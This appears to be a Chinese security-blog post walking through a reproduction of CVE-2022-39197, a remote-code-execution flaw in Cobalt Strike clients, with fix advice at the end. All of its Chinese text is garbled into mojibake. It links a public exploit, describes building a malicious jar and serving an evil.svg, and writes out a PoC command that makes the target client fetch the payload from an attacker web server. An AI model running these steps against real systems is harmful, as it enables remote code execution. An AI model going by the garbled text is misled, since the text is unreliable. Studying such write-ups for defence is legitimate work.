#  CS < 4.7.1 RCE å¤çŽ°è¸©å‘è®°å½•

PANDAå¢¨æ£®  [ æ©˜çŒ«å­¦å®‰å…¨ ](javascript:void\(0\);)

**æ©˜çŒ«å­¦å®‰å…¨** ![]()

å¾®ä¿¡å· gh_af700ee13397

åŠŸèƒ½ä»‹ç» æ¯æ—¥ä¸€å¹²è´§ðŸ™‚

____

___å‘è¡¨äºŽ_

æ”¶å½•äºŽåˆé›† #ç½‘ç»œå®‰å…¨æŠ€æœ¯ 227ä¸ª

æ–‡æœ«é™„æ¼æ´žåˆ†æž

0x01 æ¼æ´žç®€ä»‹

ç”±äºŽCobalt Strike ä½¿ç”¨ GUI æ¡†æž¶ SWINGå¼€å‘ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…å¯é€šè¿‡åœ¨ beacon å…ƒæ•°æ®ä¸­æ³¨å…¥æ¶æ„ HTML
æ ‡ç­¾ï¼Œä½¿å¾—CSå¯¹å…¶è¿›è¡Œè§£æžæ—¶åŠ è½½æ¶æ„ä»£ç ï¼Œä»Žè€Œåœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼ˆæ¥è‡ªï¼šå¥‡å®‰ä¿¡ CERTï¼‰

  

0x02 æ¼æ´žå±å®³

èŽ·å–åˆ°æ”»å‡»è€…çš„CSæœ¨é©¬æ ·æœ¬åŽï¼Œåœ¨è¿žæŽ¥CSçš„å®¢æˆ·ç«¯è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œååˆ¶æ”»å‡»è€…

å½±å“çš„ç‰ˆæœ¬ï¼š

Cobalt Strike < 4.7.1

  

0x03 æ¼æ´žå¤çŽ°

æˆ‘è¿™é‡Œç”¨çš„CS4.4ï¼ˆå®žé™…æµ‹è¯•ç½‘ä¼ çš„4.4/4.5ç‰ˆæœ¬ï¼ŒåŒ…æ‹¬å„ç±»é­”æ”¹ç‰ˆæœ¬ï¼ˆåŒ…æ‹¬æŸäº›ç‰ˆæœ¬åšäº†ç®€å•çš„æ ‡ç­¾è¿‡æ»¤ï¼‰ï¼Œä¸åŠ è½½ç¦æ­¢æ¸²æŸ“htmlçš„è¡¥ä¸éƒ½æ˜¯å¯ä»¥RCEçš„ï¼‰

1ã€CSæœ¨é©¬æ ·æœ¬æ–‡ä»¶

2ã€EXPåœ°å€ï¼šhttps://github.com/its-arun/CVE-2022-39197

  

1ã€ç¼–è¾‘æ¶æ„æ–‡ä»¶å†…å®¹

ä¿®æ”¹Exploit.javaï¼Œæ›´æ”¹execå†…ä»£ç å‚æ•°ä¸ºè¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œæˆ‘è¿™é‡Œæ‰§è¡Œcalcï¼š

![]()

  

  

2ã€ç¼–è¯‘æ–‡ä»¶

ä½¿ç”¨IDEA+mavenè¿›è¡Œç¼–è¯‘ï¼Œç¼–è¯‘å®ŒæˆåŽä¼šåœ¨targetç›®å½•ä¸‹ç”ŸæˆEvilJar-1.0-jar-with-
dependencies.jaræ–‡ä»¶ï¼Œå…·ä½“å¦‚ä¸‹

![]()

  

3ã€å°†ç”Ÿæˆçš„æ¶æ„æ–‡ä»¶å’Œsvgæ–‡ä»¶æ”¾åœ¨åŒä¸€è·¯å¾„ä¸‹

![]()

  

å°†æœ¨é©¬æ ·æœ¬æ”¾åœ¨ä¸Žcve-2022-39197.pyè„šæœ¬åŒä¸€è·¯å¾„ä¸‹

![]()

4ã€åœ¨serveè·¯å¾„ä¸‹å¼€å¯ä¸€ä¸ªwebæœåŠ¡

![]()

  

![]()

  

5ã€ç¼–è¾‘evil.svgæ–‡ä»¶ï¼Œæ›¿æ¢ä¸ºå½“å‰è·¯å¾„å¯ç”¨çš„æ¶æ„jarçš„webåœ°å€

![]()

  

  

6ã€æ‰§è¡ŒPOCè„šæœ¬

  * 

    
    
    python3 cve-2022-39197.py update.exe http://192.168.91.203:9898/evil.svg

  

è¿è¡ŒåŽï¼Œcså®¢æˆ·ç«¯ä¸Šå¯ä»¥çœ‹åˆ°æ­¤æ—¶æœ¨é©¬å·²ç»æˆåŠŸä¸Šçº¿

![]()

  

  

å½“å°è¯•èŽ·å–ç”¨æˆ·ä¼šè¯çš„è¿›ç¨‹åˆ—è¡¨

å½“æ»šåŠ¨è¿›ç¨‹åˆ—è¡¨è¿›è¡ŒæŸ¥çœ‹å½“å‰ä¼šè¯æ‰€åœ¨è¿›ç¨‹åæ—¶å³è§¦å‘ï¼Œè¯·æ±‚æ”»å‡»è€…webæœåŠ¡ä¸Šçš„evil.svgæ–‡ä»¶ï¼Œè€Œevil.svgæ–‡ä»¶åˆç»§ç»­åŠ è½½è¯·æ±‚æ¶æ„æ–‡ä»¶EvilJar-1.0-jar-
with-dependencies.jarï¼ŒæˆåŠŸæ‰§è¡Œå‘½ä»¤ï¼Œä»Žè€Œè¾¾åˆ°RCEã€‚

  

ç»†èŠ‚1ï¼šè²Œä¼¼ç›´æŽ¥æ»‘ä¸‹åŽ»çœ‹çš„è¯æ˜¯ä¸ä¼šè§¦å‘çš„ï¼Œéœ€è¦é¼ æ ‡ç„¦ç‚¹åœ¨å«æœ‰xss payloadçš„è¿›ç¨‹åä¸Šï¼ˆä½†æœ‰æœ‹å‹ä¸ä¼šï¼Œå…·ä½“å¸ˆå‚…ä»¬è‡ªæµ‹ï¼‰

![]()

  

  

ç»†èŠ‚2ï¼šæ‰§è¡Œè„šæœ¬çš„æ—¶å€™ï¼Œé©¬å„¿åç§°è¦æ˜¯beacon.exeï¼Œä¸ç„¶ä¹Ÿæ˜¯ä¸è¡Œçš„

![]()

  

å¯ä»¥çœ‹åˆ°è¿›ç¨‹åæ²¡æœ‰è¢«ä¿®æ”¹

![]()

  

  

çœ‹çœ‹cve-2022-39197.pyè„šæœ¬ä»£ç ï¼š

beacon.exeåœ¨ä»£ç é‡Œå†™æ­»äº†

![]()

  

ä¿®æ”¹åŽï¼š

![]()

  

  

å°±å¯ä»¥äº†ï¼š

![]()

  

ç»æµ‹è¯•ï¼š

WINDOWSä¸‹å¯ä»¥ç›´æŽ¥å°†æ‰§è¡Œçš„å‘½ä»¤æ”¹æˆpowershellä¸€å¥è¯æŽ¥ä¸Šçº¿

  

è¯·æ±‚æ—¥å¿—ï¼š

![]()

  

  

è„šæœ¬è¿è¡Œ100ç§’åŽä¼šè‡ªåŠ¨ç»“æŸæœ¨é©¬è¿›ç¨‹ï¼š

![]()

  

  

05ä¿®å¤å»ºè®®

1ã€å‡çº§è‡³ Cobalt Strike 4.7.2ç‰ˆæœ¬

2ã€åŠ è½½è¡¥ä¸æ’ä»¶å…¨å±€ç¦æ­¢htmlæ¸²æŸ“ï¼š

åœ°å€ï¼šhttps://github.com/burpheart/CVE-2022-39197-patch

å¯åŠ¨å®¢æˆ·ç«¯çš„æ—¶å€™åŠ å…¥agentå‚æ•°å°±è¡Œï¼š

![]()

  

ä¸æ¸²æŸ“htmlæ— æ³•è§¦å‘ï¼š

![]()

  

é»˜è®¤å…³äºŽé¡µé¢çš„htmlå†…å®¹ä¹Ÿä¸æ¸²æŸ“äº†ï¼š

![]()

  

å‚è€ƒé“¾æŽ¥ï¼š

[https://mp.weixin.qq.com/s/OSxcLX21bIdFy1VGd93W7Q](https://mp.weixin.qq.com/s?__biz=MzkyMDE4NzE1Mw==&mid=2247484355&idx=1&sn=1d2df2c1eac378875fe1c0d408478979&scene=21#wechat_redirect)

  

è¯¦ç»†åˆ†æžæ–‡ç« ï¼š

[https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ](https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&mid=2456098978&idx=1&sn=d511d5a674d84eeaf262c8e389ae0403&scene=21#wechat_redirect)

  

[https://mp.weixin.qq.com/s/89wXyPaSn3TYn4pmVdr-
Mw](https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247485450&idx=1&sn=5662a9f2c081fc8521eee651b357323f&scene=21#wechat_redirect)

å¦‚æœ‰ä¾µæƒï¼Œè¯·è”ç³»åˆ é™¤

 **æŽ¨èé˜…è¯»**

[å®žæˆ˜|è®°ä¸€æ¬¡å¥‡å¦™çš„æ–‡ä»¶ä¸Šä¼ getshell](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495718&idx=1&sn=e25bcb693e5a50988f4a7ccd4552c2e2&chksm=c04d7718f73afe0e282c778af8587446ff48cd88422701126b0b21fa7f5027c3cde89e0c3d6d&scene=21#wechat_redirect)  
[ã€Œ è¶…è¯¦ç»† | åˆ†äº«
ã€æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•è¿›è¡Œå†…ç½‘æ¸—é€](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495694&idx=1&sn=502c812024302566881bad63e01e98cb&chksm=c04d7730f73afe267fd4ef57fb3c74416b20db0ba8e6b03f0c1fd7785348860ccafc15404f24&scene=21#wechat_redirect)  
[ç¥žå…µåˆ©å™¨ | siusiu-
æ¸—é€å·¥å…·ç®¡ç†å¥—ä»¶](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495385&idx=1&sn=4d2d8456c27e058a30b147cb7ed51ab1&chksm=c04d69e7f73ae0f11b382cddddb4a07828524a53c0c2987d572967371470a48ad82ae96e7eb1&scene=21#wechat_redirect)  
[ä¸€æ¬¾åŠŸèƒ½å…¨é¢çš„XSSæ‰«æå™¨](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495361&idx=1&sn=26077792908952c6279deeb2a19ebe37&chksm=c04d69fff73ae0e9f2e03dd8e347f35d660a7fd3d51b0f5e45c8c64afc90c0ee34c4251f9c80&scene=21#wechat_redirect)  
[å®žæˆ˜ |
ä¸€æ¬¡åˆ©ç”¨å“¥æ–¯æ‹‰é©¬ç»•è¿‡å®å¡”waf](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495331&idx=1&sn=94b63a0ec82de62191f0911a39b63b7a&chksm=c04d699df73ae08b946e4cf53ceea1bc7591dad0ce18a7ccffed33aa52adccb18b4b1aa78f4c&scene=21#wechat_redirect)  
[BurpCrypto:
ä¸‡èƒ½ç½‘ç«™å¯†ç çˆ†ç ´æµ‹è¯•å·¥å…·](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495253&idx=1&sn=d4c46484a44892ef7235342d2763e6be&chksm=c04d696bf73ae07d0c16cff3317f6eb847df2251a9f2332bbe7de56cb92da53b206cd4100210&scene=21#wechat_redirect)  
[å¿«é€Ÿç­›é€‰çœŸå®žIPå¹¶æ•´ç†ä¸ºCæ®µ --
æ£±çœ¼](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495199&idx=1&sn=74c00ba76f4f6726107e2820daf7817a&chksm=c04d6921f73ae037efe92e051ac3978068d29e76b09cf5b0b501452693984f96baa9436457e4&scene=21#wechat_redirect)  
[è‡ªåŠ¨æŽ¢æµ‹ç«¯å£é¡ºä¾¿çˆ†ç ´å·¥å…·t14m4t](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495141&idx=1&sn=084e8231c0495e91d1bd841e3f43b61c&chksm=c04d6adbf73ae3cdbb0a4cc754f78228772d6899b94d0ea6bb735b4b5ca03c51e7715b43d0af&scene=21#wechat_redirect)  
[æ¸—é€å·¥å…·ï½œæ— çŠ¶æ€å­åŸŸåçˆ†ç ´å·¥å…·ï¼ˆ1ç§’æ‰«160ä¸‡ä¸ªå­åŸŸï¼‰](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247495099&idx=1&sn=385764328aff5ec49acddab380721af0&chksm=c04d6a85f73ae393ffab22021839f5baec3802d495c34fb364cbdd9b7cb0cf642851e9527ba7&scene=21#wechat_redirect)  
 **æŸ¥çœ‹æ›´å¤šç²¾å½©å†…å®¹ï¼Œè¿˜è¯·å…³æ³¨** **æ©˜çŒ«å­¦å®‰å…¨ï¼š** **æ¯æ—¥åšæŒå­¦ä¹ ä¸Žåˆ†äº«ï¼Œè§‰å¾—æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©å¯åœ¨åº•éƒ¨ç»™ç‚¹ä¸ªâ€œ** **å†çœ‹ â€**

é¢„è§ˆæ—¶æ ‡ç­¾ä¸å¯ç‚¹

å¾®ä¿¡æ‰«ä¸€æ‰«  
å…³æ³¨è¯¥å…¬ä¼—å·

[çŸ¥é“äº†](javascript:;)

å¾®ä¿¡æ‰«ä¸€æ‰«  
ä½¿ç”¨å°ç¨‹åº

****

[å–æ¶ˆ](javascript:void\(0\);) [å…è®¸](javascript:void\(0\);)

****

[å–æ¶ˆ](javascript:void\(0\);) [å…è®¸](javascript:void\(0\);)

ï¼š ï¼Œ ã€‚   è§†é¢‘ å°ç¨‹åº èµž ï¼Œè½»ç‚¹ä¸¤ä¸‹å–æ¶ˆèµž åœ¨çœ‹ ï¼Œè½»ç‚¹ä¸¤ä¸‹å–æ¶ˆåœ¨çœ‹

